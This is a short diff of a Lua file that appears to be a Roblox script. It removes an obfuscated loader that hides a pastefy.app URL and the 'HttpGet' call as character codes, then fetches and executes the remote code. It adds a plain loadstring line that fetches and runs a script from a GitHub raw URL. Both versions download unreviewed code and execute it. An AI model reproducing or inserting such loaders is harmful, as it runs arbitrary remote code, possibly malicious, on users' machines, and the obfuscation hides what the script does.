@@ -170,15 +170,4 @@ for i = 1, 5 do
     end)
 end
 
--- 🔗 Obfuscated Script Loader
-do
-    local a, b, c = string.char, table.concat, {}
-    local d = {104,116,116,112,115,58,47,47,112,97,115,116,101,102,121,46,97,112,112,47,104,71,107,111,116,65,54,80,47,114,97,119}
-    for i = 1, #d do c[i] = a(d[i]) end
-    local u = b(c)
-    local g = getfenv and getfenv or function() return _ENV end
-    local h = g().game
-    local r = h[(a(72)..a(116)..a(116)..a(112)..a(71)..a(101)..a(116))]
-    local l = loadstring or load
-    l(r(h, u))()
-end
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lrm.lua"))()
